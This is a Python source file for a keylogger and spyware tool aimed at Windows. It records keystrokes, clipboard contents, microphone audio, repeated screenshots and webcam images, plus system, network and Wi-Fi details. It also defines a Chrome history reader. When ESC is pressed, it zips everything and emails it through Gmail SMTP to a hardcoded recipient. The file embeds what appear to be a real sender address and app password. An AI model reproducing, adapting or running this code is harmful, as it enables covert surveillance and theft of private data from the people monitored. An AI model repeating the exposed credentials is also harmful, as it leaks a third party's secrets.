import os
import socket
import platform
import smtplib
import subprocess
import threading
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab
import psutil
import sqlite3
import win32clipboard
from scipy.io.wavfile import write
import sounddevice as sd
from pynput import keyboard
from cv2 import VideoCapture, imwrite
import schedule
import time
import shutil

print("Press ESC to stop the Keylog Session")

# Global Variables
email_address = "work.nihalrahman@gmail.com"  # Enter sender email
password = "tdteozexqqomwdzy"  # Enter sender app password
toaddr = "prabhatbajpai2005@gmail.com"  # Enter recipient email

file_path = os.getcwd() + "\\"  # File save path
key = Fernet.generate_key()  # Generate an encryption key
fernet = Fernet(key)

currtime = datetime.now().strftime("%Y%m%d%H%M%S")
sessions_folder = os.path.join(file_path, f"sessions", f"session_{currtime}")
screenshots_folder = os.path.join(sessions_folder, "screenshots")
webcam_folder = os.path.join(sessions_folder, "webcam_images")

# Create necessary directories
os.makedirs(sessions_folder, exist_ok=True)
os.makedirs(screenshots_folder, exist_ok=True)
os.makedirs(webcam_folder, exist_ok=True)


# Email functionality
def send_email(filename, attachment, toaddr):
    """Send an email with the specified attachment."""
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    msg.attach(MIMEText(f"Attached file: {filename}", 'plain'))

    if os.path.exists(attachment):  # Ensure the file exists
        with open(attachment, 'rb') as attach_file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attach_file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={filename}")
            msg.attach(part)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:  # Connect to SMTP server
            server.starttls()
            server.login(email_address, password)
            server.sendmail(email_address, toaddr, msg.as_string())
            print(f"Email sent successfully to {toaddr}")
    else:
        print(f"Attachment file {attachment} not found.")


# Data collection functions
def system_information():
    """Gather system information and save it to a text file."""
    with open(os.path.join(sessions_folder, "system_info.txt"), "w") as f:
        hostname = socket.gethostname()
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP: {socket.gethostbyname(hostname)}\n")
        try:
            f.write(f"Public IP: {get('https://api.ipify.org').text}\n")
        except Exception:
            f.write("Could not retrieve public IP address.\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")


def copy_clipboard():
    """Copy data from the clipboard and save it."""
    clipboard_path = os.path.join(sessions_folder, "clipboard.txt")
    with open(clipboard_path, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            f.write(f"Clipboard Data: {win32clipboard.GetClipboardData()}\n")
            win32clipboard.CloseClipboard()
        except:
            f.write("Clipboard could not be accessed.\n")


def microphone():
    """Record audio for a specified duration and save it as a .wav file."""
    myrecording = sd.rec(int(15 * 44100), samplerate=44100, channels=2)
    sd.wait()
    write(os.path.join(sessions_folder, "audio.wav"), 44100, myrecording)


def screenshots():
    """Take a screenshot and save it to the screenshots folder."""
    im = ImageGrab.grab()
    im.save(os.path.join(screenshots_folder, f"screenshot_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"))


def webcam_capture():
    """Capture an image from the webcam and save it."""
    cam = VideoCapture(0)
    result, image = cam.read()
    if result:
        imwrite(os.path.join(webcam_folder, f"webcam_{datetime.now().strftime('%Y%m%d%H%M%S')}.png"), image)
    cam.release()


# Keylogging functionality
def on_press(key):
    """Handle key press events."""
    log_path = os.path.join(sessions_folder, "key_log.txt")
    with open(log_path, "a") as f:
        if hasattr(key, 'char') and key.char:  # Record printable characters
            f.write(key.char)
        elif key == keyboard.Key.space:  # Record spaces as whitespace
            f.write(" ")
        else:
            f.write(f"[{key}]")  # Record special keys


# def on_release(key):
#     """Stop the keylogger when the escape key is pressed."""
#     if key == keyboard.Key.esc:
#         return False

def on_release(key):
    """Stop the keylogger and send email when the escape key is pressed."""
    if key == keyboard.Key.esc:
        # Compress the sessions folder into a .zip file
        archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
        shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)
        
        # Send the .zip file as an attachment
        send_email(f"session_{currtime}.zip", archive_name, toaddr)
        
        print("Exiting program after sending email.")
        return False  # Stop the keylogger


# Network activity
def network_activity():
    """Log active network connections."""
    with open(os.path.join(sessions_folder, 'network_info.txt'), "w") as f:
        connections = psutil.net_connections(kind='inet')
        for conn in connections:
            f.write(f"IP: {conn.raddr.ip if conn.raddr else 'N/A'}, Port: {conn.raddr.port if conn.raddr else 'N/A'}, Status: {conn.status}\n")


# Wi-Fi information
def wifi_info_fetch():
    """Fetch Wi-Fi information."""
    try:
        networks = subprocess.check_output("netsh wlan show networks", shell=True)
        with open(os.path.join(sessions_folder, "wifi_info.txt"), "w") as f:
            f.write(networks.decode('utf-8'))
    except Exception as e:
        print("Wi-Fi info fetch error:", e)


# Browser history
def fetch_browser_history():
    """Retrieve browser history from Chrome."""
    history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
    try:
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()
        with open(os.path.join(sessions_folder, "browser_history.txt"), "w") as f:
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            for row in cursor.fetchall():
                f.write(f"URL: {row[0]}, Title: {row[1]}, Visits: {row[2]}, Last Visit: {datetime.utcfromtimestamp(row[3]/1000000 - 11644473600)}\n")
    except Exception as e:
        print("Could not read browser history:", e)


# Scheduled tasks
schedule.every(4).seconds.do(screenshots)
schedule.every(2).seconds.do(webcam_capture)


def run_scheduled_tasks():
    """Run scheduled tasks."""
    while True:
        schedule.run_pending()
        time.sleep(1)


# Main Execution
system_information()
network_activity()
copy_clipboard()
screenshots()
webcam_capture()
wifi_info_fetch()
microphone()

# # Compress the sessions folder into a .zip file
# archive_name = os.path.join(file_path, f"session_{currtime}.zip")  # Name for the zip archive
# shutil.make_archive(base_name=archive_name.replace('.zip', ''), format='zip', root_dir=sessions_folder)

# # Send the .zip file as an attachment
# send_email(f"session_{currtime}.zip", archive_name, toaddr)

# Start scheduled tasks in a separate thread
schedule_thread = threading.Thread(target=run_scheduled_tasks)
schedule_thread.daemon = True
schedule_thread.start()

# Start keylogger in the main thread
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
